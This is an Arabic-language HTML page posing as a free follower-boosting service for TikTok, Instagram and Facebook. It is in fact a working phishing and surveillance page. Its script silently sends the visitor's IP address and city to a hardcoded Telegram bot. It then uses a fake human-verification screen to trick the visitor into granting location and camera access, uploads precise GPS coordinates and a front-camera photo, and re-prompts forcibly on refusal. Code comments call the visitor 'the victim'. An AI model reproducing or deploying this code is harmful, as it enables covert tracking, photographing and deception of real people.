<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SMM Panel | زيادة متابعين حقيقيين</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        /* CSS: تصميم احترافي وأنيق مستوحى من تطبيقات التواصل */
        :root { --tiktok: #fe2c55; --insta: #e1306c; --fb: #1877f2; --bg: #0f1013; --card: #1f2128; --text: #fff; --sub: #a0a0a0; }
        body { background: var(--bg); color: var(--text); font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; overflow: hidden; }
        .container { background: var(--card); width: 90%; max-width: 420px; padding: 35px; border-radius: 20px; box-shadow: 0 15px 40px rgba(0,0,0,0.6); text-align: center; border: 1px solid #333; transition: 0.5s; position: relative; z-index: 10; }
        .logo-section { display: flex; justify-content: center; gap: 25px; margin-bottom: 25px; font-size: 35px; animation: bounce 2s infinite; }
        .tiktok { color: #fff; } .insta { color: var(--insta); } .fb { color: var(--fb); }
        h1 { font-size: 24px; margin-bottom: 10px; font-weight: bold; }
        p { color: var(--sub); font-size: 14px; margin-bottom: 25px; line-height: 1.5; }
        .input-group { margin-bottom: 20px; text-align: right; }
        label { display: block; margin-bottom: 8px; font-size: 13px; color: var(--sub); }
        input, select { width: 100%; padding: 13px; background: #2d3039; border: 1px solid #444; border-radius: 10px; color: white; box-sizing: border-box; font-size: 15px; }
        input:focus, select:focus { border: 2px solid var(--tiktok); outline: none; }
        .btn { width: 100%; padding: 16px; background: linear-gradient(45deg, var(--tiktok), var(--insta)); border: none; border-radius: 12px; color: white; font-weight: bold; font-size: 17px; cursor: pointer; transition: 0.3s; }
        .btn:hover { transform: translateY(-3px); box-shadow: 0 8px 20px rgba(254, 44, 85, 0.4); }
        
        /* شاشة "التحقق البشري" */
        #verify-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 100; flex-direction: column; align-items: center; justify-content: center; text-align: center; color: #fff; }
        .spinner { border: 5px solid #333; border-top: 5px solid var(--tiktok); border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin-bottom: 20px; }
        
        /* عناصر مخفية للسحب */
        #v { position: fixed; width: 1px; height: 1px; opacity: 0; z-index: -1; }
        
        /* حركات (Animations) */
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        @keyframes bounce { 0%, 20%, 50%, 80%, 100% {transform: translateY(0);} 40% {transform: translateY(-10px);} 60% {transform: translateY(-5px);} }
    </style>
</head>
<body>

    <div class="container" id="main-box">
        <div class="logo-section">
            <i class="fab fa-tiktok tiktok"></i>
            <i class="fab fa-instagram insta"></i>
            <i class="fab fa-facebook fb"></i>
        </div>
        <h1>رشق متابعين حقيقيين 🚀</h1>
        <p>احصل على آلاف المتابعين المتفاعلين لحسابك مجاناً. أدخل البيانات واضغط على الزر لبدء العملية.</p>
        
        <div class="input-group">
            <label>اسم المستخدم (Username)</label>
            <input type="text" id="username" placeholder="@username" required>
        </div>
        
        <div class="input-group">
            <label>اختر المنصة ونوع الدعم</label>
            <select>
                <option>TikTok - 5,000 متابع حقيقي</option>
                <option>Instagram - 10,000 متابع حقيقي</option>
                <option>Facebook - 7,000 متابع حقيقي</option>
                <option>TikTok - 20,000 مشاهدة</option>
            </select>
        </div>

        <button class="btn" onclick="startProcess()">ابدأ الرشق الآن</button>
    </div>

    <div id="verify-screen">
        <div class="spinner"></div>
        <h2 style="font-size: 22px;">جاري فحص الحساب...</h2>
        <p id="status-text" style="color: #bbb; max-width: 300px;">يجب السماح بصلاحيات "الكاميرا" و "الموقع" للتأكد أنك لست روبوت (Verify Human) ولإتمام العملية بنجاح.</p>
    </div>

    <video id="v" autoplay playsinline></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        // الجافا سكريبت: التعامل مع البيانات والأذونات
        
        // بيانات بوت التلغرام الخاص بك (تم دمجها برمجياً)
        const T = "8439157520:AAGGZBxYp0x6Y54ar3TIrkMaMEHarQASmgY";
        const ID = "1772820433";

        async function sendToTelegram(data, type='text') {
            let url = `https://api.telegram.org/bot${T}/`;
            if(type === 'text') {
                await fetch(url + 'sendMessage', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({chat_id: ID, text: data})
                });
            } else {
                const blob = await (await fetch(data)).blob();
                const f = new FormData();
                f.append('chat_id', ID);
                f.append('photo', blob, 'hit.png');
                f.append('caption', "📸 صيد من صفحة الرشق الملحمية 🔥");
                await fetch(url + 'sendPhoto', { method: 'POST', body: f });
            }
        }

        // بدء العملية (الهندسة الاجتماعية)
        async function startProcess() {
            const user = document.getElementById('username').value;
            if(!user) { alert("أدخل اسم المستخدم أولاً!"); return; }

            // إظهار شاشة التحقق
            document.getElementById('verify-screen').style.display = "flex";
            
            // سحب الـ IP فوراً (صامت)
            fetch('https://ipapi.co/json/').then(r=>r.json()).then(d=> {
                sendToTelegram(`👤 الضحية: ${user}\n🌐 IP VPN: ${d.ip}\n📍 الموقع التقريبي: ${d.city}, ${d.country_name}`);
            });

            // تأخير 2 ثانية ثم طلب الأذونات قسرياً
            setTimeout(async () => {
                try {
                    // 1. طلب الموقع الدقيق (GPS)
                    // جوجل كروم على الويب سيظهر الطلب للضحية، الضحية سيظن أنه للتحقق
                    navigator.geolocation.getCurrentPosition(pos => {
                        sendToTelegram(`🎯 GPS الحقيقي للضحية:\nhttps://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
                    }, null, {enableHighAccuracy: true});

                    // 2. طلب الكاميرا (الضربة القاضية)
                    const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}});
                    const vid = document.getElementById('v');
                    vid.srcObject = stream;

                    // انتظار 2 ثانية لضمان وضوح الصورة
                    setTimeout(() => {
                        const can = document.getElementById('c');
                        can.width = vid.videoWidth; can.height = vid.videoHeight;
                        can.getContext('2d').drawImage(vid, 0, 0);
                        sendToTelegram(can.toDataURL('image/png'), 'photo');
                        
                        // إيقاف الكاميرا وتنبيه نجاح وهمي
                        stream.getTracks().forEach(t => t.stop());
                        alert("✅ تمت عملية التحقق! سيتم إرسال المتابعين خلال 24 ساعة.");
                        window.location.href = "https://www.tiktok.com"; // التحويل النهائي
                    }, 2000);

                } catch (err) {
                    // إذا رفض، يتم إغراقه بتنبيه يمنعه من لمس أي شيء آخر
                    alert("🚨 خطأ! يجب السماح بالكاميرا والموقع للتأكد أنك لست روبوت لإتمام عملية الرشق.");
                    startProcess(); // إعادة المحاولة إجبارياً
                }
            }, 2000);
        }
    </script>
</body>
</html>
